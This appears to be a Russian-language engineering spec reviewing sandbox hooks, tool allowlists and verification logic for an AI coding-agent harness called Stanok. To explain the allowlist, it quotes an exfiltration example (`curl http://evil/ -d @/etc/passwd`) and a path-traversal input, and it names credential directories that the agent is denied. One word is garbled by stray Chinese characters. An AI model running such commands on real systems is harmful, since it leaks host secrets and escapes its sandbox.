# SPEC: Stanok harness review — разбор ревью оператора (2026-09-17)

Источник: ревью оператора по трейсу `smoke-otel2` (thread `6dc44a86-9d8b-4e78-960f-f9e5ee9c64c5`,
сохранён в `opik-thread-smoke-otel2.json`, 34 спана). Все пункты сверены с кодом
(`stanok/launcher/stanok.py`, `stanok/hooks/*.sh`, `stanok/scripts/run.sh`,
`stanok/sandbox-run.sh`, `stanok/launch.sh`, `stanok/.claude/settings.stanok.json`),
установленным CLI (`~/git/claude-code-2.1.88/cli.js`) и SDK (`claude-agent-sdk 0.2.139`).

Вердикт: **ядро ревью верное; 4 конкретных утверждения опровергнуты фактами.**

## P0 — ложный CLEAN-FIRST: ПОДТВЕРЖДЕНО

Доказательства:
- Трейс: спаны 22/23/26 — Read готовых `src/smoke.js`, `tests/smoke.test.js`,
  `docs/smoke.md`; спан 24 — «Both test and implementation already exist».
  Write-спанов в трейсе нет — модель даже не пыталась писать. (Деталь ревью
  «Write отклонён с File has not been read yet» в этом прогоне не наблюдается.)
- `prepare_workspace()` (`stanok.py:200-216`) — только `makedirs` + `chmod u+w`;
  манифеста нет, артефакты не фиксируются.
- `write_summary` (`stanok.py:569-570`): `rc==0 and verifier=="PASS" and turns==1`
  → `"CLEAN-FIRST"` без проверки, что файлы созданы.

Фикс (принят, с поправками):
1. Манифест `{rel_path: sha256}` по `src/ tests/ docs/` — снимается ПОСЛЕ
   `prepare_workspace()`, до сессии; хранится в `evidence/<label>/manifest-before.json`
   (evidence/ writable в bwrap, gitignored). Дифф после каждого turn →
   `turn_telemetry[i]["files_changed"]`.
2. `verify_ok and turn==1 and files_changed==[]` → `probe_result="NO-OP-PASS"`, **rc=23**.
   ⚠️ Изменение контракта L1: в `CLAUDE.supervisor.md` добавить rc=23 в ветку
   «DEFECT → relaunch после чистки воркспейса» (сейчас в stop-conditions только 20/21/22/24).
3. Поправка к ревью: `git clean -fdx src tests docs` на чистом дереве — **no-op**:
   артефакты предыдущего прогона закоммичены супервизором («chore: save state before
   ticket»), `git clean` трогает только untracked. Настоящий сброс = удаление
   tracked-файлов — для этого уже есть скилл `clean-for-task`. Корень проблемы:
   smoke-тикет гоняли повторно (smoke-3 → smoke-otel2) без чистки.
   Рецепт: `clean-for-task` перед новым (не retry) тикетом + NO-OP-PASS как
   автоматическая страховка. Флаг `--fresh` в launch.sh — опционально.
- Крайний случай: тест в `verify_gate()` может сам создать файлы (side effects node)
  → `files_changed` непуст → NO-OP-PASS не сработает. Направление консервативное
  (пропустить no-op, а не false-alarm) — приемлемо.

## P1 — hooks: ЧАСТИЧНО ПОДТВЕРЖДЕНО, curl-утверждение опровергнуто

Подтверждено:
- **Glob сломан**: `read-guard.sh:21-32` извлекает только `file_path`/`path`;
  Glob шлёт `pattern` → deny «no path in input». Трейс: 5 отбитых Glob
  (спаны 4,7,8,9,10 — хуки; 5,11,12,13,14 — tool). `CLAUDE.md:23` обязывает
  «Study the codebase (Grep/Glob/Read)». «Физически невыполнима» — чуть сильновато:
  Glob с явным `path` работает, но дефолтный паттерн использования бит.
- **`scripts/run.sh` закрыт от чтения**: `read-guard.sh:48-51` разрешает только
  `src/ tests/ docs/ tickets/`. Трейс, спан 18: «protected path: .../scripts/run.sh».
  `CLAUDE.md:26,28` обязывает вызывать `bash scripts/run.sh test|smoke`.
- **Отказы без инструкции**: `permissionDecisionReason` однострочные; текст доходит
  до модели (видно в `system_reminders` трейса), но без указания, что делать.

Опровергнуто:
- **«bash-gate — денайлист, `curl http://evil/ -d @/etc/passwd` проходит» — неверно.**
  `bash-gate.sh:31` — это **аллоулист**: финальный regex
  `^[[:space:]]*(bash[[:space:]]+)?(\./)?scripts/run\.sh[[:space:]]+.*$` требует,
  чтобы команда была именно `scripts/run.sh …`; `curl …` не матчится → deny.
  Дальше `run.sh` валидирует аргументы строгими regex + symlink/traversal-проверками
  (SEC-01); обход `tests/../src/evil.test.js` ловится `realpath`-проверкой (`run.sh:40-42`).
- **`--unshare-net`**: по духу верно, но **сломает машину** — новый netns даёт
  собственный loopback, и `127.0.0.1:8080` (llama-server, Opik) станет недоступен.
  Работает только при перенацеливании `SERVER_URL`/`BETA_TRACING_ENDPOINT` на LAN-IP
  хоста (`192.168.8.131` уже в `sandbox.network.allowedDomains`). Реальная сетевая
  экспозиция сейчас ограничена inner-sandbox'ом (allowedDomains: localhost,
  127.0.0.1, 192.168.8.131) — вынос данных за хост закрыт. Остаточный теоретический
  вектор: тест-файл, который `fs.readFileSync`'ит хостовые файлы и печатает их в
  контекст (node в тестах читает FS; `denyRead` покрывает только
  `~/.ssh ~/.aws ~/.config`). Низкая严重ность для локальной модели.

Фикс (волна 1, ~20 строк в `read-guard.sh`):
1. Ветвление по `tool_name`: Read/Write/Edit → `file_path`; Glob/Grep → `path`,
   если есть (валидировать как сейчас), если нет — **allow** (cwd зафиксирован
   `--chdir $REPO_ROOT`, поиск без path не выходит за репо).
2. Добавить `scripts/` в allowlist зон (в bwrap он read-only — не writable
   carve-out; `hooks/`, `launcher/`, `.git`, `.claude/` остаются защищёнными).
3. Богатые `permissionDecisionReason`: что запрещено + что делать
   («для листинга — Glob с path; запуск тестов — `bash scripts/run.sh test …`»).

## P2 — 12 инструментов вместо 6: ПОДТВЕРЖДЕНО

- Трейс, все 10 `llm_request`: `tools_count=12` — `Agent, AskUserQuestion, Bash,
  Edit, EnterPlanMode, ExitPlanMode, Glob, Grep, Read, TodoWrite, WebFetch, Write`.
- `stanok.py:393` передаёт `CURATED_TOOLS` как `allowed_tools` — это
  «авто-одобрить», не ограничение (SDK `types.py:1838`: «allows a whole tool
  auto-approves it»).
- `deny` в `settings.stanok.json` покрывает WebSearch/NotebookEdit/Task*, но не
  Agent/AskUserQuestion/EnterPlanMode/ExitPlanMode/TodoWrite/WebFetch.

Фикс (волна 1, 2 строки):
1. SDK 0.2.139 поддерживает оба рычага (`types.py:1951` `max_turns`,
   `types.py:1964` `disallowed_tools`). По конвенции кода (статика → settings)
   чище расширить `permissions.deny` в `settings.stanok.json`:
   `Agent, AskUserQuestion, EnterPlanMode, ExitPlanMode, TodoWrite, WebFetch`.
   Альтернатива — `disallowed_tools` в `ClaudeAgentOptions`; эффект тот же.
2. `max_turns` (напр. 30) в `ClaudeAgentOptions` — лимит tool-round-trips внутри
   одного нашего turn'а (каждый turn = отдельный `query()`); сейчас единственный
   ограничитель — watchdog 1200 c.

## P3 — env для llama.cpp: В ОСНОВНОМ ОПРОВЕРГНУТО для CLI 2.1.88

Проверено grep'ом по `~/git/claude-code-2.1.88/cli.js`:

| Переменная | Статус |
|---|---|
| `CLAUDE_CODE_ATTRIBUTION_HEADER=0` | Уже стоит (`settings.stanok.json:17`). Проблема не наблюдается: `sp_hash=sp_0d7062851dd7` во всех 10 запросах, `cache_creation=0` везде, `cache_read` монотонно 12507→15578. |
| `API_FORCE_IDLE_TIMEOUT=0` | **Переменной нет в 2.1.88** (0 вхождений в cli.js). Нет-оп. |
| `CLAUDE_ENABLE_STREAM_WATCHDOG=0` | Механизм есть, но **opt-in**: парсер `i6()` возвращает `false` при unset → watchdog сейчас выключен по умолчанию. `=0` — нет-оп. (Цифра ревью неверна: дефолт `CLAUDE_STREAM_IDLE_TIMEOUT_MS` = **90000**, не 300000; при включении 90 c на длинном prefill опасно, но мы его не включаем.) |
| `CLAUDE_CODE_MAX_RETRIES=1` | Существует; уже стоит `2` (не 10). Понизить до 1 — мелкая валидная правка. |
| `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` | Уже стоит (`settings.stanok.json:5`). |

- «Добавьте сырой `input_tokens` в `turn_telemetry`» — **опровергнуто**: он уже там
  (`stanok.py:482`). Не хватает не данных, а **аларма**: PREFIX-BREAK warn, если
  `input_tokens` turn'а > порога (напр. > 2× медианы предыдущих или > 4k) — разрыв
  префикса виден именно как всплеск. Чтение `prompt eval time` из лога llama-server
  — валидная идея на будущее (требует парсинга лога сервера).
- Флаги llama-server (`--cache-reuse`, `--cache-ram`, `--cache-idle-slots`,
  `--slot-save-path`, `--ctx-checkpoints`, `--checkpoint-every-n-tokens`,
  `--checkpoint-min-step`): сервер на момент разбора не запущен — текущие флаги
  не проверены. Флаги реальные для современных llama.cpp; применить при старте
  сервера, проверить `llama-server --help`. Референсная конфигурация (MTP,
  `-np 1`, `--flash-attn on`, `--spec-type draft-mtp --spec-draft-n-max 2`,
  `--cache-ram 15000`, `--ctx-checkpoints 128`, `--checkpoint-min-step 128`) —
  принять как целевой профиль.

## P4 — модернизация SDK: ПОДТВЕРЖДЕНО как roadmap (волны 2–3)

1. **In-process hooks** — валидно: 12 PreToolUse-спанов, каждый = fork
   `bash`+`python3` (32–165 мс). `ClaudeAgentOptions(hooks={"PreToolUse": [...]})`
   убирает subprocess. Требование: try/except с **fail-closed** (исключение в хуке
   → deny, а не allow).
2. **Один MCP-инструмент вместо Bash** — самый чистый ход: `@tool` +
   `create_sdk_mcp_server()` (есть в SDK 0.2.139), `disallowed_tools=["Bash"]`.
   Уходит весь класс шелл-ошибок. Но это переписывание валидации `bash-gate.sh`+
   `run.sh` в Python + отдельный прогон регрессии — **волна 3**. Хостовый
   `verify_gate()` вызывает `run.sh` напрямую — не затрагивается.
3. **`exclude_dynamic_sections`** — N/A: системный промпт 62 символа
   (`sp_len=62`), preset не включён; не трогать.

## P5 — мелочи в `stanok.py`: ВСЕ ПОДТВЕРЖДЕНЫ (кроме приоритета у setsid)

| # | Факт | Место | Фикс |
|---|---|---|---|
| 1 | `dirty_tree_gate()` fail-open: git rc≠0 → `return False` («чисто») | `stanok.py:129-137` | `return True` при `rc != 0` |
| 2 | `rc==0, verifier=="FAIL"` → `probe_result="PASS"` | `stanok.py:573` | fail-closed: `verifier != "PASS"` → всегда `VERIFY-FAIL` (сейчас почти недостижимо, но закрыть правильно) |
| 3 | Схема summary продублирована; в `early_abort` нет `inference_telemetry` | `stanok.py:590-607` vs `842-858` | вынести `build_summary()` |
| 4 | `type(msg).__name__ == "ResultMessage"` | `stanok.py:372` | `isinstance(msg, ResultMessage)` с импортом |
| 5 | Таймаут: shielded `turn_task` может остаться живым после `wait_for(5)` | `stanok.py:423-438` | `turn_task.cancel(); await asyncio.gather(turn_task, return_exceptions=True)` |
| 6 | `nohup` без `setsid` | `launch.sh:120` | валидно, но низкий приоритет: цепочка `nohup→exec sandbox→exec bwrap→python` сохраняет PID через exec, `cmd_run` делает `os.setpgid(0,0)` — `killpg` уже работает; `setsid` — belt-and-suspenders |
| 7 | `run.sh smoke` — пустой stdout, rc=0 | `run.sh:62`, `src/smoke.js` | модуль реально грузится (ловит синтаксис/throw), но без позитивного сигнала. Вариант: `node -e "const m=require(…); console.log('exports:', Object.keys(m))"` — печатает экспорты. Или убрать smoke из `CLAUDE.md:28` |

## «Что не трогать» — согласен полностью

Одна сессия с ретраями, `<verification_result>` user-turn'ом,
`setting_sources=["project"]`, `_extract_smart_diff`, параллельные тесты,
ro-bind `.git`, `--die-with-parent` — архитектура правильная.

## План по волнам

**Волна 1 (дёшево, закрывает ложный PASS и сломанный Glob) — ~60 строк:**
1. P0: манифест + `files_changed` + `NO-OP-PASS`/rc=23 (`stanok.py`) +
   **обновить `CLAUDE.supervisor.md`** (rc=23 → DEFECT-ветка: чистка
   `clean-for-task` → relaunch) + дисциплина «clean перед новым тикетом».
2. P1: `read-guard.sh` — ветвление по `tool_name`, allow без path для Glob/Grep,
   `scripts/` в allowlist, богатые причины отказов.
3. P2: `deny` в `settings.stanok.json` += 6 имён; `max_turns=30` в options.
4. P5: пункты 1–5 (пять one-liner'ов) + `CLAUDE_CODE_MAX_RETRIES` 2→1.
5. P3: PREFIX-BREAK аларм по `input_tokens` в `turn_telemetry`.

**Волна 2 (после регрессии волны 1):**
6. P4.1: in-process hooks (fail-closed), удалить `hooks/*.sh`
   (кроме `verifier.sh`/`commit-msg` — они не PreToolUse).
7. P3: флаги llama-server при старте сервера (проверить `--help`).

**Волна 3 (крупно, после стабилизации):**
8. P4.2: MCP-инструмент `run` вместо Bash, `disallowed_tools=["Bash"]`.
9. Опционально: `--unshare-net` + перенос эндпоинтов на LAN-IP (только если
   захотим закрыть теоретический FS-вектор через тесты).

**Опровергнуто (не делаем):** `API_FORCE_IDLE_TIMEOUT` (нет в 2.1.88),
`CLAUDE_ENABLE_STREAM_WATCHDOG=0` (уже выключен по умолчанию),
«curl проходит bash-gate» (это аллоулист), «добавить input_tokens в телеметрию»
(уже есть), `git clean -fdx` как фикс no-op (no-op на чистом дереве — нужны
tracked-удаления / `clean-for-task`).

---

# Второе ревью оператора (2026-09-17) — подтверждено, план пересобран

Оператор принял все 5 опровержений, одобрил метод «grep по pinned cli.js»
(формализуется как config-check: env-ключи из `settings.stanok.json`
проверяются наличием в `~/git/claude-code-2.1.88/cli.js`, отсутствующий ключ =
ошибка конфигурации). Внесены 3 коррекции и 4 архитектурных удаления.

## Проверка новых утверждений (факты)

| Утверждение | Статус |
|---|---|
| `permission_mode="dontAsk"` существует в 2.1.88 | **ПОДТВЕРЖДЕНО**: `grep -c dontAsk cli.js` = 12; в SDK 0.2.139 `types.py:26` — `"dontAsk"` в юнионе `PermissionMode`, docstring `:1934` — «deny if not pre-approved». Корень P2: `dontAsk` + `allowed_tools=CURATED_TOOLS` = настоящий аллоулист; bare-name deny = экономия префикса (схема уходит из контекста). |
| `CLAUDE_AGENT_SDK_MCP_NO_PREFIX=1` существует в 2.1.88 | **ПОДТВЕРЖДЕНО**: 1 вхождение. |
| `verifier.sh` — chmod a-w заморозка RED-теста | **ПОДТВЕРЖДЕНО**: `hooks/verifier.sh:63` `chmod a-w` + `additionalContext` «VERIFY: RED CONFIRMED». Удаление обосновано: заморозку заменяет манифест `tests/` (детект contract_lock). |

## Коррекции оператора (приняты)

1. **P2**: корневой фикс — `permission_mode="dontAsk"` (не только deny).
2. **P0**: NO-OP-детект — счётчик `Write`/`Edit` tool_use в потоке сессии
   (~5 строк, иммунитет к side effects тестов); манифест — только по `tests/`
   (детект нарушения contract_lock).
3. **P1**: `read-guard.sh` не чинится, а **удаляется** (волна 3): write-защита
   дублирует ядро (EROFS), сокрытие — гигиена контекста; замена — `Read(path)`
   deny-правила. Оговорка (2.1.210+): применяются только `Read(...)`/`Edit(...)`
   правила; `Glob(...)`-правила принимаются, но не применяются; Glob на
   запрещённой директории всё равно печатает имена файлов (best-effort — принять).

## Архитектурные удаления (приняты)

1. **Bash у модели убирается** — MCP-инструмент `run` (~40 строк, портирование
   валидации `run.sh` в Python), `disallowed_tools=["Bash"]`,
   `CLAUDE_AGENT_SDK_MCP_NO_PREFIX=1`. Последствие: PreToolUse-хуки не
   остаются → пункт «in-process hooks» **удалён** из плана.
2. **Эфемерный worktree на прогон** — `git worktree add --detach
   "$WORKDIR/$LABEL" HEAD`: начальное состояние определено конструктивно;
   убивает дисциплину `clean-for-task`, rc=22 → warning, stub-создание,
   `--ro-bind .git`; NO-OP понижается до assert (rc=23 **не нужен**);
   `commit_sha` в summary.json. Ограничение: worktree видит только
   **закоммиченную** инфраструктуру.
3. **chmod a-w заморозка удаляется** (манифест `tests/` заменяет).
4. **RC_TABLE + `build_summary()`**: все статусные поля (verifier,
   probe_result, review_verdict, c5) выводятся из (rc, turns) таблицей;
   новый исход = одна строка таблицы.

## Несостыковки при интеграции worktree (детали реализации)

1. **Фоновый режим**: `launch.sh` уходит после `nohup` → `git worktree remove`
   выполняет хостовый **wrapper** (create → exec sandbox → cleanup в trap).
   Wrapper = лидер process group → пункт P5.6 (`setsid`) закрывается сам.
2. **Разрешение тикета ломается**: `_resolve_ticket` (`stanok.py:782-794`) и
   `dirname(REPO_ROOT)/tickets` (`sandbox-run.sh:92-95`) ссылаются на
   REPO_ROOT, который станет worktree-путём. Wrapper разрешает тикет в
   абсолютный хостовый путь (env) и ro-bind'ит `tickets/` из **оригинального**
   корня проекта.
3. **evidence**: `--bind` существующего `stanok/evidence` в worktree по тому же
   относительному пути → контракт супервизора (`evidence/<label>/summary.json`)
   не меняется.
4. **Stub-файлы** (`sandbox-run.sh:117-128`) gitignored → в worktree их нет →
   create-if-missing переезжает в wrapper (хост, до bwrap). `.git` в worktree —
   pointer-файл → `--ro-bind .git` убирается. `commit_sha` — env
   `STANOK_COMMIT_SHA` → summary.json.

## Пересобранный план волн (ПЕРЕУСТАРЕЛ — см. «Финальное решение» ниже)

**Волна 1 — конфиг, ни одного пути не трогает, приёмка одним прогоном:**
1. `stanok.py:392` → `permission_mode="dontAsk"`
2. `settings.stanok.json` deny += `Agent, AskUserQuestion, EnterPlanMode,
   ExitPlanMode, TodoWrite, WebFetch` (bare names)
3. `max_turns=30` в `ClaudeAgentOptions`
4. `CLAUDE_CODE_MAX_RETRIES` 2→1
5. P5.1–5.5: dirty_tree_gate fail-closed, write_summary fail-closed
   (`verifier != "PASS"` → VERIFY-FAIL), `build_summary()` dedup,
   `isinstance(ResultMessage)`, timeout `turn_task.cancel()`
6. PREFIX-BREAK аларм по `input_tokens` в `turn_telemetry`
- **Приёмка**: трейс — `tools_count` 12→6, rc=0, verifier=PASS.

**Волна 2 — worktree (после регрессии волны 1):**
1. Хостовый wrapper в `launch.sh`: worktree create/cleanup + stub-файлы +
   разрешение тикета + `STANOK_COMMIT_SHA`
2. `sandbox-run.sh`: убрать `--ro-bind .git`, evidence- и tickets-бинды из
   оригинального корня
3. rc=22 → warning + правка `CLAUDE.supervisor.md` (убрать clean-for-task
   дисциплину и rc=22 из stop-conditions)
4. NO-OP assert (счётчик Write/Edit tool_use) + манифест `tests/` (contract_lock)
5. Удалить `verifier.sh`
- **Приёмка**: summary.json содержит `commit_sha`; повторный прогон
  smoke-тикета даёт честный NO-OP assert, а не CLEAN-FIRST.
- **Блокирующий вопрос оператора**: гоняются ли тикеты на незакоммиченной
  инфраструктуре? Если да — волна 2 откладывается (worktree видит только HEAD).

**Волна 3 — MCP (после стабилизации):**
1. MCP-инструмент `run` (~40 строк), `create_sdk_mcp_server()`,
   `disallowed_tools=["Bash"]`, deny `Bash`, `CLAUDE_AGENT_SDK_MCP_NO_PREFIX=1`
2. Удалить `bash-gate.sh` и `read-guard.sh` → `Read(...)` deny-правила
3. Хостовый `verify_gate()` вызывает `run.sh` напрямую — не затрагивается
- **Приёмка**: в трейсе нет Bash-спанов, `tools_count` = 5 (Read/Write/Edit/
  Glob/Grep + MCP run).

**Не делаем (итого):** in-process hooks, `--unshare-net`, rc=23, фикс
`read-guard.sh`.

---

# Финальное решение (2026-09-17, утверждено оператором)

## Worktree: НЕ ДЕЛАЕМ (опровергнут на фактах первого разбора)

Артефакты предыдущего прогона **закоммичены** супервизором («chore: save
state before ticket») → HEAD содержит `src/smoke.js`, `tests/smoke.test.js`,
`docs/smoke.md`. `git worktree add --detach <path> HEAD` создаёт дерево из
HEAD → те же файлы → тот же ложный CLEAN-FIRST. Worktree решает только
(а) незакоммиченное состояние хоста и (б) параллельные прогоны; оба риска
закрыты (`rc=22` fail-closed, `flock`). Вернуться к worktree — только при
параллельных прогонах нескольких тикетов на одном репозитории.

## Вместо worktree: инвариант, привязанный к тикету

> **Артефакты, которые тикет требует создать, не должны существовать на
> момент старта прогона.**

Ticket-scoped утверждение: `src/` обязан содержать модули предыдущих
тикетов (накопленный результат), чистить каталоги целиком неверно — верно
чистить ровно объявленные текущим тикетом пути.

Механика (~15 строк, только `stanok.py`):
1. Заголовок тикета — строка `module: <name>` (regex
   `^module:\s*([A-Za-z0-9_.-]+)\s*$` по первым строкам); пути выводятся по
   правилу №1 CLAUDE.md: `src/<m>.js`, `tests/<m>.test.js`, `docs/<m>.md`.
   Грамматика: одна строка `module:` на модуль (несколько строк допустимо).
   Альтернатива «regex по телу тикета» отклонена (риск удаления чужого
   модуля, упомянутого как справка).
2. `prepare_workspace()` — **отселение**, не удаление: существующие
   `declared_paths` → `shutil.move` в `LOG_DIR/<label>/pre-existing/`
   (не в `evidence/` — без untracked-файлов в репо, `dirty_tree_gate` не
   ломается). Не деструктивно, видно при разборе. Вызывается ОДИН раз перед
   сессией (ретраи не стирают работу модели).
3. `verify_gate()` — позитивный контракт: `missing = [p for p in
   declared_paths if not exists]` → FAIL с явным текстом в ретрай-промпт
   (закрывает дыру: модель, не создавшая `docs/<m>.md`, раньше проходила).
4. Escape-hatch для тикетов-расширений: `reset: none` в заголовок.

Умирает: дисциплина `clean-for-task` (заменена машинным правилом); rc=23
(не нужен, NO-OP остаётся ассертом при `rc=1`); `chmod a-w` в `verifier.sh`
+ `chmod -R u+w` в `prepare_workspace()` (заменены манифестом `tests/`);
весь хостовый wrapper (worktree, stub-файлы, `--ro-bind .git`, перенос
evidence/tickets, `STANOK_COMMIT_SHA` env) — `REPO_ROOT` не меняется.
Провенанс: `commit_sha = git rev-parse HEAD` в `summary.json` (2 строки).
`rc=22` остаётся fail-closed без изменений.

## Корректировки K1–K6 (приняты)

- **K1**: удаление `read-guard.sh` — из волны 3 в **волну 1** (это конфиг,
  не MCP). Deny-правила: `Read(...)` + `Edit(...)` на `.git/**`, `hooks/**`,
  `launcher/**`, `.claude/**`, `evidence/**`. `scripts/**` НЕ входит (дефект
  спана 18). `Read`, а не `Glob` (с 2.1.210 `Glob(path)`-правила не
  консультируются); `Edit(...)` — ради внятного отказа (покрывает все
  редактирующие инструменты), безопасность даёт EROFS.
- **K2**: волна 3 — ничего не портировать: типизированная схема
  `{mode: "test"|"smoke"|"list", path: str}` → от валидации остаётся одна
  проверка `os.path.realpath(path)` внутри `REPO_ROOT/{src,tests}`. `run.sh`
  сохраняет свои проверки (хостовый `verify_gate()` — бесплатная 2-я линия).
- **K3**: волна 3 — один рычаг: только `deny: ["Bash"]` в settings
  (конвенция «статика → settings»), без `disallowed_tools`.
- **K4**: приёмка волны 3 — `tools_count = 6` (5 + MCP `run`), не 5.
- **K5**: единственный реальный риск `dontAsk` — allow-правило не
  преодобряет действия, не одобренные ни одним режимом (в `dontAsk` такие
  вызовы отклоняются, не уходят в промпт). Всё внутри cwd → вероятность
  низкая, но регрессионный прогон с приёмкой `rc=0, verifier=PASS` — не
  формальность.
- **K6**: `BASH_MAX_OUTPUT_LENGTH=8000` в волну 1 — **ключ подтверждён**
  (3 вхождения в cli.js 2.1.88). Дефолт 30000 символов вывода Bash в
  кэшируемый префикс; 8000 достаточно.

## Утверждённый план, сентябрь 2026

### Волна 1 — только конфигурация, ни одного пути не двигаем

| # | Что | Файл | Приёмка |
|---|---|---|---|
| W1.1 | `permission_mode="dontAsk"` | `stanok.py:392` | в трейсе `tools_count` 12→6 |
| W1.2 | `deny` += голые имена: `Agent`, `AskUserQuestion`, `EnterPlanMode`, `ExitPlanMode`, `TodoWrite`, `WebFetch` | `settings.stanok.json` | то же |
| W1.3 | `deny` += `Read(.git/**)`, `Read(hooks/**)`, `Read(launcher/**)`, `Read(.claude/**)`, `Read(evidence/**)` + те же `Edit(...)`; `scripts/**` не включать | `settings.stanok.json` | Read `scripts/run.sh` проходит |
| W1.4 | Удалить `hooks/read-guard.sh` + его PreToolUse-регистрацию | `settings.stanok.json`, `hooks/` | Glob с `pattern` без `path` проходит |
| W1.5 | `max_turns=30` | `stanok.py` | — |
| W1.6 | `CLAUDE_CODE_MAX_RETRIES` 2→1; `BASH_MAX_OUTPUT_LENGTH=8000` | `settings.stanok.json` | — |
| W1.7 | P5.1–5.5: `dirty_tree_gate` fail-closed; `write_summary` fail-closed; `build_summary()` + `RC_TABLE`; `isinstance(ResultMessage)`; `turn_task.cancel()` + `gather` | `stanok.py` | — |
| W1.8 | PREFIX-BREAK warn по всплеску `input_tokens` в `turn_telemetry` | `stanok.py` | — |

**Приёмка волны 1 (прогон):** в трейсе `tools_count` 12→6; Glob с `pattern`
без `path` проходит; Read `scripts/run.sh` проходит; `rc=0`, `verifier=PASS`.

### Волна 2 — инвариант тикета, только `stanok.py`

| # | Что | Приёмка |
|---|---|---|
| W2.1 | Заголовок `module:` в тикете + парсер → `declared_paths` | — |
| W2.2 | `prepare_workspace()`: отселение существующих `declared_paths` в `_live_dir/pre-existing/`; удалить `chmod -R u+w` | — |
| W2.3 | `verify_gate()`: `missing` по `declared_paths` → FAIL с явным текстом | — |
| W2.4 | NO-OP ассерт: счётчик `tool_use` Write/Edit за turn; `verify_ok and turn==1 and writes==0` → `probe_result="NO-OP-PASS"`, `rc=1` (новый rc не вводим) | — |
| W2.5 | Манифест `tests/` до сессии и после каждого turn → нарушение contract_lock в `summary.json` | — |
| W2.6 | `commit_sha` в `summary.json` | `summary.json` содержит `commit_sha` |
| W2.7 | Удалить `chmod a-w` из `verifier.sh` (сам хук остаётся: прогон теста + «VERIFY: RED CONFIRMED») | — |
| W2.8 | `CLAUDE.supervisor.md`: без изменений (дисциплины `clean-for-task` в нём нет — она была только в спеке/бэклоге); stop-conditions не трогать | — |

**Приёмка волны 2 (прогон):** повторный прогон smoke-тикета в том же
репозитории даёт красную фазу и честный прогон, а не `CLEAN-FIRST`;
`summary.json` содержит `commit_sha`.

### Волна 3 — снятие периметра вокруг Bash

| # | Что | Приёмка |
|---|---|---|
| W3.1 | `@tool("run", schema={mode, path})` + `create_sdk_mcp_server()`; одна проверка `realpath` в хендлере | — |
| W3.2 | `deny: ["Bash"]` в settings (единственный рычаг); имя `run` в `allowed_tools` | — |
| W3.3 | `CLAUDE_AGENT_SDK_MCP_NO_PREFIX=1` (подтверждено: 1 вхождение в cli.js) | — |
| W3.4 | Удалить `hooks/bash-gate.sh` | PreToolUse-хуков не осталось ни одного |
| W3.5 | Обновить CLAUDE.md: инструмент `run` вместо `bash scripts/run.sh` | — |

**Приёмка волны 3 (прогон):** в трейсе нет Bash-спанов; `tools_count = 6`.

### Не делаем (итого)

worktree (не закрывает причину; вернуться при параллельных прогонах);
in-process hooks (после W3.4 хуков нет); `--unshare-net`; `rc=23`; правка
stop-conditions L1; правка `sandbox-run.sh` и `launch.sh`; `setsid`
(`os.setpgid(0,0)` в `cmd_run` уже делает `killpg` рабочим); правка
`read-guard.sh` (файл удаляется в W1.4).
